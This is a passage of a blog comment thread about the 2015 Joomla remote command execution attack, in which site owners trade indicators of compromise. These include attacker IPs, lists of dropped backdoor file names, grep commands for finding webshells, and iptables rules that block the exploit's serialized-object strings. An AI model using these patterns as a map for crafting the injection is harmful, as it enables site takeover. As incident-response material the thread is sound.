			<p class="comment-meta"><time class="comment-time" datetime="2015-12-14T23:17:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7073">December 14, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Ah, the comment showed up eventually (below). It&#8217;s at pastebin dot com URLs /jbjqdcmx and /e25zxcn6 .</p>
<p>I&#8217;ve since found a small number of sites where the shell DID get installed, and someone started using it to send spam. It looks like the payload they&#8217;re sending only works on some sites (perhaps 10-15% of the ones that were attacked?); not sure which or why. It&#8217;s also not yet clear to me if the &#8220;send the attacker the configuration.php file&#8221; part of the payload worked on only the ones where the shell install worked, or if that part worked on all of them.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt depth-5" id="comment-7077">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/7389fca87e62d824b044f4f397a19fb5?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/7389fca87e62d824b044f4f397a19fb5?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Matt Thomson</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-15T01:49:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7077">December 15, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Hi Robert,</p>
<p>Could you please post the file paths to where shell did get installed on your sites and the filepaths of any files it tries to patch thanks.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even depth-5" id="comment-7114">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/835a729ab13565335d5c6b2f1e5c9b6a?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/835a729ab13565335d5c6b2f1e5c9b6a?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Dom</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-16T09:38:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7114">December 16, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>and mine seems to be more &#8220;elaborate&#8221; pastebin /rp23dRin</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt depth-5" id="comment-7088">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/0223c98c957099e2cb2480790a62076d?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/0223c98c957099e2cb2480790a62076d?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Mex</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-15T08:04:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7088">December 15, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>yes, you do: none of my comments with naxsi-rules (included | linked) showed up on your blog, not just this article, which is sad.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment even depth-4" id="comment-7094">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/978d965162938ce8f9b3831410a38253?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/978d965162938ce8f9b3831410a38253?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">WooDzu</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-15T11:14:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7094">December 15, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>After analysing the logs it looks like the attack was unsuccessful<br />
and the only thing that secured my website was a non-www to www<br />
redirection on Apache. Basically the $_POST[111] payload was sent to non-www address and was redirected away. The bot didn&#8217;t bother to resent to www address.</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment odd alt depth-5" id="comment-7140">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/700ec1373ae2f02f1a11d5cf7f2eac53?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/700ec1373ae2f02f1a11d5cf7f2eac53?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://www.the12monkeys.com/" class="comment-author-link" rel="external nofollow" itemprop="url">Xristoph (X70) C.Rad</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-16T17:01:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7140">December 16, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>WooDzu, are you serious??? LOL that&#8217;s great&#8230;guess by default of my setup I&#8217;m protected too by the power of triple w</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment even depth-2" id="comment-7085">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/a30b13d6d37a32f13de83133e23afd55?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/a30b13d6d37a32f13de83133e23afd55?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://incolor.net/" class="comment-author-link" rel="external nofollow" itemprop="url">A Fisher</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-15T05:38:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7085">December 15, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>For my sites that were accessed by the above IP addresses, I&#8217;ve found that the following file was modified on the same day. The contents are not only suspicious, they&#8217;re completely different from the stock Joomla file: libraries/joomla/session/session.php</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment odd alt depth-3" id="comment-7139">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/700ec1373ae2f02f1a11d5cf7f2eac53?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/700ec1373ae2f02f1a11d5cf7f2eac53?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://www.the12monkeys.com/" class="comment-author-link" rel="external nofollow" itemprop="url">Xristoph (X70) C.Rad</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-16T16:59:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7139">December 16, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Thanks A Fisher, good to know which file we should keep an eye on. RSFirewall has a nifty new feature that allows for file comparison within the joomla admin control panel which has already proved useful.</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment even depth-4" id="comment-7171">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/a30b13d6d37a32f13de83133e23afd55?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/a30b13d6d37a32f13de83133e23afd55?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://incolor.net/" class="comment-author-link" rel="external nofollow" itemprop="url">A Fisher</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-20T03:36:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7171">December 20, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>I found the changed file by using the file change scanner in Akeeba Admin Tools</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment odd alt thread-even depth-1" id="comment-7046">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://dcid.me" class="comment-author-link" rel="external nofollow" itemprop="url">Daniel Cid</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-14T20:57:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7046">December 14, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Absolutely. The &#8220;one click update&#8221; applies to all affected versions? Or only for those on 3.4.x so far?</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even thread-odd thread-alt depth-1" id="comment-7056">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/3b2882cfd45e8aa3b2d08a693de409f6?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/3b2882cfd45e8aa3b2d08a693de409f6?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">TheOne</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-14T21:46:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7056">December 14, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>What log do I need to look for? access_log? I cannot find this </p>
<p>grep JDatabaseDriverMysqli access_log nothing found</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment odd alt depth-2" id="comment-7057">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://dcid.me" class="comment-author-link" rel="external nofollow" itemprop="url">Daniel Cid</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-14T22:10:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7057">December 14, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Try to look on all your access log files. Depending on how your server is configured, they would be inside /var/log/http or /var/log/apache2 or ~/logs. You can even try a &#8220;grep -r&#8221; to go through all files and see if there is any hits there.</p>
<p>thanks,</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment even thread-even depth-1" id="comment-7060">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://dcid.me" class="comment-author-link" rel="external nofollow" itemprop="url">Daniel Cid</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-14T22:12:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7060">December 14, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Awesome, thanks for the update. We will link to it in the post as well.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt thread-odd thread-alt depth-1" id="comment-7061">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://dcid.me" class="comment-author-link" rel="external nofollow" itemprop="url">Daniel Cid</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-14T22:13:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7061">December 14, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Thanks for confirming. Will link to your post as well.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even thread-even depth-1" id="comment-7064">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/4b7f47ad3bda3f6f25b424ce25b53fbd?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/4b7f47ad3bda3f6f25b424ce25b53fbd?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Brandon Weston</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-14T22:35:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7064">December 14, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>I&#8217;ve been going through access logs and 4 of our websites were targeted by that described attack, with the same IP actually (146.0.72.83 ). Some of them returned code 200, which has me a little concerned. Do you have any information about where the payload is dropped?</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment odd alt depth-2" id="comment-7236">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/45777e1472385c9312db4e55bb64ddaf?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/45777e1472385c9312db4e55bb64ddaf?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Greg</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2016-01-16T05:35:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7236">January 16, 2016</a></time></p>		</header>

		<div class="comment-content">
			
			<p>We have found several new files and mod files across various sites, here are the most common<br />
/media/editors/tinymce/skins/lightgray/img/thumb.php<br />
/media/editors/tinymce/skins/lightgray/img/strange.php<br />
/libraries/index.php<br />
/includes/framework.php (modified header)<br />
/includes/defines.php (modified header)<br />
/media/system/js/thumb.php<br />
/cookietest.php<br />
/joomla_verwx1.php<br />
/upload_e45.php<br />
/update_rxd.php<br />
/conf_bmx.php<br />
/upload_dni.php<br />
/update_rxd.php<br />
/conf_pue.php<br />
/upload_3x0.php<br />
/joomla_verw8f.php<br />
/config.php<br />
/wsdl.php<br />
/error.php<br />
/kurd.php<br />
/joomla_ver5fm.php<br />
/upload_v8v.php<br />
/upload_gxo.php<br />
/upload_51i.php<br />
/update_g6z.php<br />
/joomla_veria6.php<br />
/upload_eln.php<br />
/upload_guo.php<br />
/upload_sj5.php<br />
/update_rbu.php</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment even thread-odd thread-alt depth-1" id="comment-7065">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/4c7eec676a9b4662214e9198afa29acb?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/4c7eec676a9b4662214e9198afa29acb?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Phil Taylor</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-14T22:37:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7065">December 14, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>But no mention that this is &#8211; and was &#8211; a WP hack a few months ago, that this is just a clone of a well known  technique already investigated by others, or that the result of this hack is a payload that effects 3 Joomla code files (/includes/framework.php, /includes/defines.php, /index.php) and uploads FilesMan backdoors to several places with several different known filenames &#8211; the payload &#8211; that YOUR customers are asking you for, that you dont seem to know&#8230; these files are dropped. </p>
<p>sort.php<br />
conf.php<br />
utf8.php<br />
cp1251.php<br />
backup.php<br />
cache.php<br />
reverse.php<br />
bin.php<br />
cgi.php<br />
memcache.php<br />
sql.php</p>
<p>all decoded from the seen FULL hack&#8230; all you are reporting is the basic stuff.  You are also not noticing that the full hack involves PHP&#8217;s way of deserialising session objects, and the upstream PHP bug therein. And you are failing to report that SimplePie can be tweaked to override its validation of cache function names&#8230; so pretty much your blog post is very little based on actual facts about this particular hack.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt thread-even depth-1" id="comment-7067">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/28d8746f8e51a51aa7d086610f4bec37?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/28d8746f8e51a51aa7d086610f4bec37?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">SamuelTSteiner</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-14T22:47:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7067">December 14, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Again? Really? Another zero day exploit??? Joomla wth? </p>
<p>So did the Firewall block this exploit or is my site potentially hacked at this point?</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment even depth-2" id="comment-7129">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://dcid.me" class="comment-author-link" rel="external nofollow" itemprop="url">Daniel Cid</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-16T15:58:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7129">December 16, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>This vulnerability can&#8217;t even be blamed to Joomla directly. The security of your site should not be dependent on flawless code alone. Almost everyone that applied security in depth were protected against this vulnerability. (or able to react fast)</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment odd alt thread-odd thread-alt depth-1" id="comment-7075">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/f591a6e3b3a029ba6f25795352823504?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/f591a6e3b3a029ba6f25795352823504?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">cryan</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-15T00:48:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7075">December 15, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Is there a simple patch for Joomla 3.0.2. I can&#8217;t seem to update my site without bricking it. Even a simple code change in sessions.php (as per Joomla 1.5 hotfix) that someone could provide? I have no modify permissions (Win IIS) outside of tmp and cache directories for IUSR account, will this protect me?</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even thread-even depth-1" id="comment-7076">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/18617a4f711a1a33644c97da269c9d33?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/18617a4f711a1a33644c97da269c9d33?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Anna Mendez</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-15T01:00:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7076">December 15, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>How is possible to check of shell is installed? where should be if installed?<br />
also, wich files you mean when you say &#8216;patch the buggy files&#8217;?</p>
<p>Sorry for my dummies question.<br />
Many thanks on advance</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment odd alt depth-2" id="comment-7078">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/b53f222408243b040d402ebb629940a8?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/b53f222408243b040d402ebb629940a8?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://www.lexiconn.com/blog/" class="comment-author-link" rel="external nofollow" itemprop="url">Rob Mangiafico</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-15T02:11:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7078">December 15, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Use this grep to find any shell files &#8211; we&#8217;ve found this in common on all of the hacked Joomlas and any uploaded files:<br />
grep -rl &#8216;default_action = &#8216; ./ &#8211;include=*.php</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment even thread-odd thread-alt depth-1" id="comment-7080">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/5a96c8a2bef4ef0f719c1f36ec7b90cf?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/5a96c8a2bef4ef0f719c1f36ec7b90cf?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Dan</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-15T03:38:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7080">December 15, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Does anyone know if this vulnerability is blocked or not by:<br />
&#8211;  modesecurity<br />
&#8211;  cloudflare<br />
&#8211;  incapsula</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt thread-even depth-1" id="comment-7086">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/b840347c9b647b15a27b29c5c72b6297?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/b840347c9b647b15a27b29c5c72b6297?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Lszl Kovcs</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-15T07:29:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7086">December 15, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>iptables -A INPUT -s 146.0.72.83 -j DROP<br />
iptables -A INPUT -s 74.3.170.33 -j DROP<br />
iptables -A INPUT -s 194.28.174.106 -j DROP<br />
iptables -A INPUT -s 35.0.127.52 -j DROP<br />
iptables -A INPUT -p tcp &#8211;dport 80 -m string &#8211;algo bm &#8211;string &#8220;JDatabaseDriverMysqli&#8221; -j DROP<br />
iptables -A INPUT -p tcp &#8211;dport 80 -m string &#8211;algo bm &#8211;string &#8220;O:&#8221; -j DROP</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment even depth-2" id="comment-7099">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://dcid.me" class="comment-author-link" rel="external nofollow" itemprop="url">Daniel Cid</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-15T14:34:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7099">December 15, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Great rules. Might be a bit too aggressive, since it will block things outside of the user agent as well.</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment odd alt depth-3" id="comment-7113">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/b840347c9b647b15a27b29c5c72b6297?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/b840347c9b647b15a27b29c5c72b6297?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Lszl Kovcs</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-16T07:15:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7113">December 16, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>A bit.  We removed this:</p>
<p>iptables -A INPUT -p tcp &#8211;dport 80 -m string &#8211;algo bm &#8211;string &#8220;O:&#8221; -j DROP</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment even thread-odd thread-alt depth-1" id="comment-7087">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/c77eb506b7bf0e494439dbf459e41d87?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/c77eb506b7bf0e494439dbf459e41d87?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Els</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-15T07:35:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7087">December 15, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Silly question: if the site was attacked, what is the &#8220;remediation / incident response phase&#8221; you mention above? I&#8217;ve already applied the hotfix (Joomla 1.5), but it sounds like that would only work pre-attack, not post-attack?</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment odd alt depth-2" id="comment-7124">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://dcid.me" class="comment-author-link" rel="external nofollow" itemprop="url">Daniel Cid</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-16T15:49:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7124">December 16, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Yes, that only works pre-attack. Post-compromise, you have to to do a full cleanup and remove whatever backdoor/malware they added.</p>
<p>An easy way is to diff (compare) your current version with your last backup. Find all modified files and see if they have been injected. Or even revert back to your last known/good backup.</p>
<p>A second option is to try to search for the last files modified and see if they are hacked, but not 100% effective.</p>
<p>We also offer remediation (cleanup) as part of our plans if you do not want to do it yourself:</p>
<p><a href="https://sucuri.net/website-antivirus/" rel="nofollow ugc">https://sucuri.net/website-antivirus/</a></p>
<p>thanks!</p>
		</div>

		
		
	</article>
